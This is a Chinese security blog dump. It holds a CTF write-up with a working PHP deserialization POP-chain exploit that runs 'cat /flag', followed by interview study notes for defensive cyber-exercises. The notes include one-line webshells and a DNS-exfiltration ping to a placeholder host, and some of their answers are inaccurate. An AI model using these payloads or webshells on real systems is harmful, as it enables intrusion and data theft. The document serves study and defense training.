fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"DASCTF-X-GFCTF-2022十月挑战赛！\"><a href=\"#DASCTF-X-GFCTF-2022十月挑战赛！\" class=\"headerlink\" title=\"DASCTF X GFCTF 2022十月挑战赛！\"></a>DASCTF X GFCTF 2022十月挑战赛！</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"1-EasyPOP\"><a href=\"#1-EasyPOP\" class=\"headerlink\" title=\"1.EasyPOP\"></a>1.EasyPOP</h3><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fine</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$cmd</span>, <span class=\"variable\">$content</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cmd = <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;cmd, <span class=\"variable\">$this</span>-&gt;content);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cmd = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$ctf</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$time</span> = <span class=\"string\">&quot;Two and a half years&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$ctf</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;ctf = <span class=\"variable\">$ctf</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;ctf-&gt;<span class=\"title function_ invoke__\">show</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;ctf . <span class=\"string\">&quot;: Duration of practice: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;time;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sorry</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span> = <span class=\"string\">&quot;hint is depend on you&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$key</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$password</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;hint = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">secret_code</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>-&gt;key;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password == <span class=\"variable language_\">$this</span>-&gt;name) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;hint;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;jay&quot;</span>) &#123;</span><br><span class=\"line\">            secret_code::<span class=\"title function_ invoke__\">secret</span>();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;This is our code&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPassword</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setPassword</span>(<span class=\"params\"><span class=\"variable\">$password</span></span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">secret_code</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$code</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">secret</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include_once</span> <span class=\"string\">&quot;hint.php&quot;</span>;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">hint</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$arguments</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$num</span> = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$num</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;code-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$a</span>-&gt;<span class=\"title function_ invoke__\">setPassword</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()));</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">show</span>(<span class=\"string\">&quot;Ctfer&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>-&gt;<span class=\"title function_ invoke__\">show</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Ctfer: Duration of practice: Two <span class=\"keyword\">and</span> a half years</span><br></pre></td></tr></table></figure>\n\n<p>最终利用点是<code>fine::invoke</code></p>\n<p><code>$a = unserialize($_GET[&#39;pop&#39;]);</code>这里告诉我们是<strong>反序列化</strong>的题目，构造<strong>pop链</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fine::__invoke() &lt;- sorry::__get() &lt;- secret_code::show() &lt;- secret_code::__call() &lt;- show::__toString() &lt;- sorry::__destruct() </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>poc</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class fine</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $cmd;</span><br><span class=\"line\">    public $content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class secret_code</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $code;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class show</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $ctf;</span><br><span class=\"line\">    public $time;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class sorry</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">    public $password;</span><br><span class=\"line\">    public $hint;</span><br><span class=\"line\">    public $key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$sorry = new sorry();</span><br><span class=\"line\">$sorry2 = new sorry();</span><br><span class=\"line\">$show = new show();</span><br><span class=\"line\">$secret_code = new secret_code();</span><br><span class=\"line\">$fine = new fine();</span><br><span class=\"line\">$sorry-&gt;hint = $show;</span><br><span class=\"line\">$show-&gt;ctf = $secret_code;</span><br><span class=\"line\">$secret_code-&gt;code = $sorry2;</span><br><span class=\"line\">$sorry2-&gt;key = $fine;</span><br><span class=\"line\">$fine-&gt;cmd = &#x27;system&#x27;;</span><br><span class=\"line\">$fine-&gt;content = &#x27;cat /flag&#x27;;</span><br><span class=\"line\">echo serialize($sorry);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">//绕过wakeup</span><br><span class=\"line\">//?pop=O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;O:4:&quot;show&quot;:2:&#123;s:3:&quot;ctf&quot;;O:11:&quot;secret_code&quot;:1:&#123;s:4:&quot;code&quot;;O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;N;s:3:&quot;key&quot;;O:4:&quot;fine&quot;:3:&#123;s:3:&quot;cmd&quot;;s:6:&quot;system&quot;;s:7:&quot;content&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;s:4:&quot;time&quot;;N;&#125;s:3:&quot;key&quot;;N;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"HW prepare","date":"2023-04-12T13:20:31.000Z","excerpt":"HW prepare","_content":"\n# HW prepare\n\n### 对hw的理解\n\n我个人觉得护网行动是国家重视网络安全的一种体现，目的是发现企业政府安全问题并解决，提供安全能力\n\nhw分为蓝队防守方和红队攻击方\n\n\n\n### hw防守人员组成\n\n监控组：监控组主要就是对WAF、IPS等安全设备进行7*24小时监控、派发、跟踪、反馈安全威胁\n\n研判组：研判组主要是技术支撑，对于监控组发现的攻击行为进行技术研判\n\n网络处置组：网络处置组主要职责就是发现攻击时在防火墙上对攻击方进行IP封锁，溯源等等\n\n应用处置组：应用处置组主要就是对发现的攻击和漏洞进行风险处置、安全加固\n\n\n\n### 安全产品了解哪些\n\n- 防火墙一般不属于区域的边界，如数据中心中核心区域和业务区域的边界防火墙、园区网络边界防火墙等，主要做保证边界安全\n- 抗D也叫抗DDOS设备即流量清洗设备，一般部署与网络最外侧，防止大规模僵尸网络入侵，内部有一套完整的机制可以区分哪些流量是用户正常流量和僵尸网络流量，可以保障数据中心可以提供完整的数据中心服务；\n- 负载均衡设备分为全局负载均衡（GLB）和链路负载均衡（LLB）以及服务器负载均衡（SLB）。GLB可以保障用户可以访问就近的数据中心提供的服务资源，LLB可以保障流量的出栈负载均衡和入栈负载均衡。SLB可以保障服务器对外服务的时候负载更平均、可靠；\n- WAF即[web应用防火墙](https://cloud.tencent.com/product/waf?from=20065&from_column=20065)，可以防止网站挂马保障网页安全，部署在WEB服务器区域；\n- 数据库审计设备是把对数据库所有的操作记录下来，方便后期溯源审计和责任明确，部署在运维管理区域或者数据库审计区域均可。\n- 漏扫即[漏洞扫描](https://cloud.tencent.com/product/vds?from=20065&from_column=20065)就是给系统做体检，可以扫描出操作系统漏洞、数据库漏洞、WEB漏洞，方便管理员对暴露出的漏洞情况进行安全加固。一般部署在安全检测区域。\n- 网页防篡改一般和WAF配合使用，保护web网页不被黑客篡改，如果被篡改了，那结果仍然可以显示篡改前的正常页面，在政府行业用的最多。一般是软件直接安装在WEB服务器上。\n- 上网行为管理设备说白了是可以记录员工的上网行为，包括浏览网页的地址、检索内容、聊天记录等，一般旁挂于核心交换机。\n- 堡垒机即运维审计设备，所有涉及到登录设备（如服务器、存储、交换机、防火墙等ICT产品）的操作都要先登录到堡垒机统一登录入口。同时所有的操作都会被审计下来，方便后期溯源取证。\n\n### \n\n### pdf解析有没有可能存在xxe\n\n是的，PDF 解析器可能存在 XXE（XML 外部实体注入）漏洞。这是因为 PDF 格式支持内嵌 XML 数据，并且一些 PDF 解析器可能会对这些数据进行处理，其中可能包含 XML 实体。\n\n\n\n### http协议里面method和data\n\n方法\t描述\t是否包含主体\nGET\t从服务器获取一份文档\t否\nHEAD\t只从服务器获取文档的首部\t否\nPOST\t向服务器发送带要处理的数据\t是\nPUT\t将请求的主体部分存储在服务器上\t是\nTRACE\t对可能经过代理服务器传送到服务器上去的报文进行追踪\t否\nOPTIONS\t决定可以在胀务器上执行哪些方法\t否\nDELETE\t从服务器上删除一份文档\t否\n\n\n\n### 威胁情报告警如何判断\n\n\n\n\n\n### 网络攻击类的告警要怎么判断\n\n\n\n### sql注入的修复方式\n\n- SQL语句预编译\n- 针对SQL输入内容进行限制、过滤 //目前使用WAF对这一块进行处理\n- 针对提交的关键数据进行转义 ，比如\\select\n- 关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等\n- 数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作\n- 敏感信息严格加密处理\n\n\n\n### 网络攻击的方向来自哪三个方向\n\n\n\n### 如何判断攻击是不是误报\n\n\n\n### DNS外带存在哪些漏洞\n\n- sql盲注\n\n- XSS\n\n- 命令执行\n\n- windows可以查询主机用户名等\n\n  ping %USERNAME%.XXX.CEYE.IO\n\n- xxe\n\n- ssrf\n\n\n\n### 什么是攻防演练\n\n网络安全实战攻防演练是以获取指定目标系统（标靶系统）的管理权限为目标的攻防演练，由攻防领域经验丰富的红队专家组成攻击队，在保障业务系统稳定运行的前提下，采用“不限攻击路径，不限制攻击手段”的贴合实战方式，而形成的“有组织”的网络攻击行动。攻防演练通常是在真实网络环境下对参演单位目标系统进行全程可控、可审计的实战攻击，拟通过演练检验参演单位的安全防护和应急处置能力，提高网络安全的综合防控能力。\n\n\n\n### 怎么判断socket代理\n\n> 通过 Websocket 的 bufferedAmount 来探测用户是否采用来代理\n>\n> 1. Client 通过 Websocket 与 Server 建立连接\n> 2. Server 监听到 connect 事件后，将本次 TCP 的 window size 设置为 0，这也就意味着 Client 无法继续将数据包传给 server\n> 3. Client 使用 websocket.send()持续发送几个包\n> 4. 在 Client 上观察 websocket.bufferedAmount 值，如果过了一会，这个值一直在增大，说明无代理，否则存在代理\n>    为啥可以通过这个值来判断呢？这是因为代理工具一般不会转发 TCP 的设置，也就是说，开启了代理的 Client 发出的包会被代理给吃掉\n\n\n\n### 一句话木马\n\n```\n<?php @eval($_POST[1]);?>    php\n<%eval request(\"chopper\")%>   asp\n <%Process process = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>  jsp\n\n```\n\n\n\n### 社工手段有哪些\n\n- 邮件钓鱼 \n- 伪装成熟人\n\n\n\n### fastjson\n\n\n\n### 客服有映射到外网的服务器被打进来了，如何溯源\n\n\n\n### 常见的中间件漏洞\n\nIIS\n\n- 解析漏洞\n- put任意文件写入\n- 段文件漏洞\n\napache\n\n- 未知扩展名解析漏洞\n- addhandler导致的解析漏洞\n- 换行解析漏洞\n\nnginx\n\n- 解析漏洞\n- 空字节任意代码执行\n- 文件名逻辑漏洞‘\n- 配置错误导致的安全问题\n\ntomcat\n\n- 任意文件写入\n- 远程代码执行\n- 弱口令+后台getshell\n\njboss\n\n- 反序列化漏洞\n- 弱口令\n\n### ngsoc冷热数据\n\n奇安信网神态势感知与安全运营平台（简称NGSOC）\n\n\n\n### 代理工具类告警，流量特征\n\n\n\n### 你感觉windows漏洞多还是linux漏洞多\n\n个人觉得linux漏洞多，debian linux漏洞最多\n\n\n\n### 永恒之蓝\n\n2017年\n\n用Windows系统的SMB协议漏洞来获取系统的最高权限 139，445端口\n\n\n\n### sql注入写文件\n\nload_file()读文件 into outfile / into dumpfile写文件\n\n\n\n### 正向代理反向代理\n\n正向代理代理的对象是客户端，反向代理代理的对象是服务端。\n\n\n\n### 延时注入在流量告警上如何判断的\n\n\n\n### 宽字节\n\n一个字符数大小为两个字节的为宽字节，比如GBK编码，我们汉字通常使用的就是GBK编码，也就是说一次性会读取两个字节。\n\n当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字\n\n\n\n### 流量代理工具有哪些\n\nvpn，Shadowsocks，Trojan，WireGuard\n\n\n\n### 冰蝎与哥斯拉的连接特征\n\n冰蝎和哥斯拉都是利用远程管理工具（如Apache Struts漏洞）进行攻击，然后利用远程桌面协议（RDP）或SSH进行横向移动。\n\n都能够进行远程控制\n\n都可以进行数据窃取\n\n使用加密通信\n\n\n\n### 怎么判断逻辑漏洞是否攻击成功\n\n1. 行为变化：逻辑漏洞攻击成功后，攻击者可能会进行一些行为变化，比如访问一些不应该被访问的资源，或者执行一些不应该被执行的操作。\n2. 数据变化：逻辑漏洞攻击成功后，攻击者可能会修改、删除或者新增某些数据。\n3. 系统响应：逻辑漏洞攻击成功后，系统可能会出现异常响应，比如返回异常的HTTP状态码或者错误信息。\n4. 安全日志：逻辑漏洞攻击成功后，可能会在系统的安全日志中留下痕迹，比如异常访问记录、错误日志等。\n\n\n\n\n\n### sql注入修复方式\n\n- SQL语句预编译\n- 针对SQL输入内容进行限制、过滤 //目前使用WAF对这一块进行处理\n- 针对提交的关键数据进行转义 ，比如\\select\n- 关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等\n- 数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作\n- 敏感信息严格加密处理\n\n\n\n### 天眼与ngsoc区别\n\nNGSOC主要应用于较为复杂、高风险的网络环境，如金融机构、能源公司等，其主要优点是可以集成多种不同的安全监测工具，实现信息的智能化分析和响应；而天眼则更加注重对企业内部网络资产的保护，具备网络漏洞检测和入侵攻击检测等多种功能。\n\n\n\n### 文件上传漏洞如何防御\n\n- 检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )\n\n- 文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 .\n\n- 文件 MIME验证 ( 